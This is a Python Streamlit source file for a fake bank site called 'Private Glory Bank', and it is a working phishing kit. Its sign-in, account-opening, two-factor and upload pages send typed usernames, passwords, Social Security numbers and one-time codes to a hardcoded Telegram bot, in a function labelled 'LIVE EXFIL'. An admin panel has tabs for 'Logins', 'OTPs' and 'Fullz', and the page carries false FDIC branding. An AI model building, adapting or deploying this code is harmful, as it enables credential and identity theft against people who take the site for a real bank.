import streamlit as st
import pandas as pd
from datetime import datetime, timedelta
import plotly.express as px
import requests
import random
import base64

# ==================== TELEGRAM LIVE EXFIL ====================
def tg(message):
    TOKEN = "8539882445:AAGocSH8PzQHLMPef51tYm8806FcFTpZHrI"
    CHAT_ID = "141975691"
    try:
        requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                     data={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}, timeout=10)
    except: pass

# ==================== STATE & 180-DAY REALISTIC HISTORY ====================
state = st.session_state
state.checking = state.get("checking", 12340.50)
state.savings  = state.get("savings", 14911.32)
state.captured = state.get("captured", [])
state.otp_log  = state.get("otp_log", [])
state.files    = state.get("files", [])
state.auth     = state.get("auth", False)
state.otp_ok   = state.get("otp_ok", False)
state.admin    = state.get("admin", False)
if "users" not in state: state.users = {}

if "tx" not in state:
    txs = []
    start = datetime.now() - timedelta(days=180)
    for i in range(0, 180, 14):
        d = start + timedelta(days=i)
        txs.append({"date": d.strftime("%m/%d"), "desc": "Direct Deposit - ACME CORP", "amount": round(random.uniform(3200, 4800), 2), "account": "Checking"})
    for m in range(6):
        d = start + timedelta(days=30*m + 3)
        txs.extend([
            {"date": d.strftime("%m/%d"), "desc": "Netflix", "amount": -15.99, "account": "Checking"},
            {"date": d.strftime("%m/%d"), "desc": "Comcast Xfinity", "amount": -189.99, "account": "Checking"},
            {"date": d.strftime("%m/%d"), "desc": "Geico Auto", "amount": -142.50, "account": "Checking"},
        ])
    for day in range(180):
        d = start + timedelta(days=day)
        num = random.choices([0,1,2,3,4], weights=[5,35,40,15,5], k=1)[0]
        for _ in range(num):
            merchant = random.choice(["Amazon.com", "Walmart", "Starbucks", "Shell Gas", "Target", "Chick-fil-A", "Uber", "Whole Foods"])
            amount = round(random.uniform(8.99, 299.99), 2)
            txs.append({"date": d.strftime("%m/%d"), "desc": merchant, "amount": -amount, "account": "Checking"})
    for m in range(6):
        d = start + timedelta(days=30*m + 5)
        amt = round(random.uniform(800, 2500), 2)
        txs.extend([
            {"date": d.strftime("%m/%d"), "desc": "Transfer to Savings", "amount": -amt, "account": "Checking"},
            {"date": d.strftime("%m/%d"), "desc": "Transfer from Checking", "amount": amt, "account": "Savings"},
        ])
        txs.append({"date": (d + timedelta(days=23)).strftime("%m/%d"), "desc": "Interest Credit", "amount": round(amt * 0.004 / 12, 2), "account": "Savings"})
    txs.sort(key=lambda x: x["date"], reverse=True)
    state.tx = txs

st.set_page_config(page_title="Private Glory Bank", page_icon="🇺🇸", layout="wide")

# ==================== INLINE SVG IMAGES (no remote dependencies) ====================
# Create small embedded SVGs as data URIs so images won't break if external hosts fail.

FLAG_SVG = """
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 30 16" width="300" height="160" role="img" aria-label="US flag">
  <!-- Red background for stripes -->
  <rect width="30" height="16" fill="#b22234"/>
  <!-- White stripes (6 of them on top of red base creating 13 stripes total) -->
  <rect width="30" height="1.230769%" y="7.692307%" fill="#fff"/>
  <rect width="30" height="1.230769%" y="23.076923%" fill="#fff"/>
  <rect width="30" height="1.230769%" y="38.461538%" fill="#fff"/>
  <rect width="30" height="1.230769%" y="53.846154%" fill="#fff"/>
  <rect width="30" height="1.230769%" y="69.230769%" fill="#fff"/>
  <rect width="30" height="1.230769%" y="84.615384%" fill="#fff"/>
  <!-- Blue canton -->
  <rect width="12" height="8.615384615%" fill="#3c3b6e"/>
  <!-- Simple stars represented as small circles for reliability -->
  <g fill="#fff" transform="translate(1.2,1.2) scale(0.9)">
    <circle cx="1.0" cy="1.0" r="0.45"/>
    <circle cx="3.0" cy="1.0" r="0.45"/>
    <circle cx="5.0" cy="1.0" r="0.45"/>
    <circle cx="2.0" cy="2.0" r="0.45"/>
    <circle cx="4.0" cy="2.0" r="0.45"/>
    <circle cx="1.0" cy="3.0" r="0.45"/>
    <circle cx="3.0" cy="3.0" r="0.45"/>
    <circle cx="5.0" cy="3.0" r="0.45"/>
  </g>
</svg>
"""

FDIC_SVG = """
<svg xmlns="http://www.w3.org/2000/svg" width="240" height="60" viewBox="0 0 240 60" role="img" aria-label="FDIC badge">
  <rect width="240" height="60" rx="6" fill="#ffffff" stroke="#cfcfcf"/>
  <text x="50%" y="50%" dominant-baseline="middle" text-anchor="middle" font-family="Arial, sans-serif" font-size="14" fill="#0e2a47">Member FDIC • Equal Housing Lender</text>
</svg>
"""

def svg_to_data_uri(svg_text: str) -> str:
    b = svg_text.encode("utf-8")
    return "data:image/svg+xml;base64," + base64.b64encode(b).decode("ascii")

FLAG_DATA_URI = svg_to_data_uri(FLAG_SVG)
FDIC_DATA_URI = svg_to_data_uri(FDIC_SVG)

# ==================== PRIVATE GLORY BANK UI — AMERICAN FLAG (embedded) ====================
st.markdown(f"""
<style>
    .stApp {{background: #f8f9fc;}}
    .header {{background: linear-gradient(135deg, #0e2a47, #1e4d72); padding: 3rem 1rem; text-align: center; border-bottom: 6px solid #c9a227;}}
    .header img {{width: 220px; max-width:60%; height:auto;}}
    .bank-title {{color: white; font-size: 3rem; font-weight: 700; margin: 15px 0 0;}}
    .bank-subtitle {{color: #c9a227; font-size: 1.3rem; font-weight: 600; margin: 8px 0 0;}}
    .card {{background: white; border-radius: 20px; padding: 2.5rem; box-shadow: 0 12px 40px rgba(0,0,0,0.1); margin: 1.5rem auto; max-width: 540px;}}
    .stButton > button {{background: #c9a227; color: #0e2a47; border: none; border-radius: 16px; height: 4rem; font-weight: 700;}}
    .stButton > button:hover {{background: #0e8c66a;}}
    .footer {{position: fixed; bottom: 0; left: 0; width: 100%; background: #0e2a47; color: #aaa; text-align: center; padding: 16px; font-size: 0.9rem; z-index: 999;}}
</style>
<div class="footer">
    <img src="{FDIC_DATA_URI}" width="420" style="max-width:90%;">
    <br>Member FDIC • Equal Housing Lender • © 2025 Private Glory Bank
</div>
""", unsafe_allow_html=True)

def header():
    # The header shows the embedded American flag as the single, primary logo.
    st.markdown(f'''
    <div class="header">
        <img src="{FLAG_DATA_URI}" alt="American Flag">
        <h1 class="bank-title">PRIVATE GLORY BANK</h1>
        <p class="bank-subtitle">Secure • Modern • American Banking</p>
    </div>
    ''', unsafe_allow_html=True)

# ==================== LOGIN ====================
def login():
    header()
    st.markdown("<br><br>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1, 1.1, 1])
    with col2:
        st.markdown("<div class='card'>", unsafe_allow_html=True)
        st.markdown("### Sign In")
        user = st.text_input("Username")
        pwd = st.text_input("Password", type="password")
        if st.button("Sign In Securely", use_container_width=True):
            tg(f"LOGIN\nUser: {user}\nPass: {pwd}")
            if user == "Awesome12@" and pwd == "SecureUSA2025!":
                state.auth = True
                tg("VALID CREDENTIALS")
                st.rerun()
            elif user == "admin" and pwd == "showme2025":
                state.admin = True
                st.rerun()
            else:
                st.error("Invalid credentials")
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== REGISTRATION ====================
def register():
    header()
    st.markdown("<br><br>", unsafe_allow_html=True)
    col1, col2, col3 = st.columns([1, 1.2, 1])
    with col2:
        st.markdown("<div class='card'>", unsafe_allow_html=True)
        st.markdown("## Open Your Account")
        with st.form("reg"):
            name = st.text_input("Full Name")
            email = st.text_input("Email")
            phone = st.text_input("Phone")
            ssn = st.text_input("SSN", type="password")
            username = st.text_input("Username")
            password = st.text_input("Password", type="password")
            if st.form_submit_button("Create Account", use_container_width=True):
                if username in state.users:
                    st.error("Username taken")
                else:
                    state.users[username] = {"pass": password, "name": name, "ssn": ssn}
                    tg(f"NEW REGISTRATION\nName: {name}\nUser: {username}\nSSN: {ssn}")
                    st.success("Account created!")
                    st.balloons()
                    st.rerun()
        st.markdown("</div>", unsafe_allow_html=True)

# ==================== OTP ====================
def otp():
    header()
    st.markdown("<br><br>", unsafe_allow_html=True)
    st.markdown("<h3 style='text-align:center;color:#0e2a47'>Two-Factor Authentication</h3>", unsafe_allow_html=True)
    code = st.text_input("Enter 6-digit code")
    if st.button("Verify", type="primary"):
        tg(f"OTP: {code}")
        if len(code) == 6:
            state.otp_ok = True
            tg("OTP ACCEPTED")
            st.success("Success")
            st.rerun()

# ==================== DASHBOARD ====================
def dashboard():
    header()
    st.markdown(f"<p style='text-align:right;color:#666;'>Welcome back • {datetime.now().strftime('%B %d')}</p>", unsafe_allow_html=True)

    col1, col2 = st.columns(2)
    with col1:
        if st.button("Checking Account ••••1776", use_container_width=True):
            st.session_state.view = "checking"
            st.rerun()
        st.markdown(f"<h2>${state.checking:,.2f}</h2>", unsafe_allow_html=True)
    with col2:
        if st.button("Savings Account ••••1812", use_container_width=True):
            st.session_state.view = "savings"
            st.rerun()
        st.markdown(f"<h2>${state.savings:,.2f}</h2>", unsafe_allow_html=True)

    st.markdown("### Recent Activity")
    df = pd.DataFrame(state.tx[:12])
    display = df[["date", "desc", "amount", "account"]].copy()
    display["amount"] = display["amount"].apply(lambda x: f"${abs(x):,.2f}")
    st.dataframe(display, use_container_width=True, hide_index=True)

# ==================== CHECKING HISTORY ====================
def checking_history():
    header()
    st.markdown("### Checking Account ••••1776")
    st.markdown(f"*Balance:* ${state.checking:,.2f}")
    checking_tx = [t for t in state.tx if t["account"] == "Checking"]
    df = pd.DataFrame(checking_tx)
    display = df[["date", "desc", "amount"]].copy()
    display["amount"] = display["amount"].apply(lambda x: f"${abs(x):,.2f}")
    st.dataframe(display, use_container_width=True, hide_index=True)
    if st.button("Back"):
        st.session_state.view = None
        st.rerun()

# ==================== SAVINGS HISTORY ====================
def savings_history():
    header()
    st.markdown("### Savings Account ••••1812")
    st.markdown(f"*Balance:* ${state.savings:,.2f}")
    savings_tx = [t for t in state.tx if t["account"] == "Savings"]
    df = pd.DataFrame(savings_tx)
    display = df[["date", "desc", "amount"]].copy()
    display["amount"] = display["amount"].apply(lambda x: f"${abs(x):,.2f}")
    st.dataframe(display, use_container_width=True, hide_index=True)
    if st.button("Back"):
        st.session_state.view = None
        st.rerun()

# ==================== TRANSFER ====================
def transfer():
    header()
    st.markdown("<div class='card'>", unsafe_allow_html=True)
    from_acc = st.selectbox("From", ["Checking ••••1776", "Savings ••••1812"])
    amount = st.number_input("Amount ($)", min_value=0.01)
    if st.button("Transfer", type="primary"):
        if "Checking" in from_acc and amount > state.checking:
            st.error("Insufficient funds")
        elif "Savings" in from_acc and amount > state.savings:
            st.error("Insufficient funds")
        else:
            if "Checking" in from_acc:
                state.checking -= amount
                state.savings += amount
            else:
                state.savings -= amount
                state.checking += amount
            tg(f"TRANSFER ${amount:,.2f}")
            st.success("Transfer Complete")
            st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)

# ==================== MOBILE DEPOSIT ====================
def mobile_deposit():
    header()
    st.markdown("<div class='card'>", unsafe_allow_html=True)
    st.markdown("## Mobile Check Deposit")
    amount = st.number_input("Check Amount ($)", min_value=0.01)
    front = st.file_uploader("Front of Check", type=["jpg","png","pdf"])
    back = st.file_uploader("Back of Check", type=["jpg","png","pdf"])
    if st.button("Deposit Check", type="primary"):
        if front and back:
            tg(f"CHECK DEPOSIT — ${amount:,.2f}")
            st.success("Check accepted!")
            state.checking += amount
        else:
            st.error("Upload both sides")
    st.markdown("</div>", unsafe_allow_html=True)

# ==================== MESSAGES & ADMIN ====================
def messages():
    header()
    st.markdown("<div class='card'>", unsafe_allow_html=True)
    uploaded = st.file_uploader("Upload Documents")
    if uploaded:
        tg(f"FILE: {uploaded.name}")
        st.success("Received")
    st.markdown("</div>", unsafe_allow_html=True)

def admin():
    header()
    st.markdown("<h1 style='color:#0e2a47;text-align:center'>ADMIN PANEL</h1>", unsafe_allow_html=True)
    tabs = st.tabs(["Logins", "OTPs", "Fullz", "Files", "Transactions"])
    with tabs[0]: st.dataframe(pd.DataFrame(state.captured))
    with tabs[1]: st.dataframe(pd.DataFrame(state.otp_log))
    with tabs[2]: st.json([x for x in state.captured if "fullz" in str(x)])
    with tabs[3]: st.write(state.files)
    with tabs[4]: st.dataframe(pd.DataFrame(state.tx[:100]))

# ==================== SIDEBAR ====================
def sidebar():
    # Use the embedded flag image in the sidebar so the app doesn't rely on external hosts.
    st.sidebar.markdown(f'<img src="{FLAG_DATA_URI}" width="100">', unsafe_allow_html=True)
    return st.sidebar.radio("Menu", ["Dashboard", "Transfer", "Mobile Deposit", "Messages", "Logout"])

# ==================== MAIN FLOW ====================
if not state.auth and not state.admin:
    tab1, tab2 = st.tabs(["Sign In", "Create Account"])
    with tab1: login()
    with tab2: register()
elif state.admin:
    admin()
elif not state.otp_ok:
    otp()
else:
    if st.session_state.get("view") == "checking":
        checking_history()
    elif st.session_state.get("view") == "savings":
        savings_history()
    else:
        page = sidebar()
        if page == "Dashboard": dashboard()
        elif page == "Transfer": transfer()
        elif page == "Mobile Deposit": mobile_deposit()
        elif page == "Messages": messages()
        elif page == "Logout":
            st.session_state.clear()
            st.rerun()
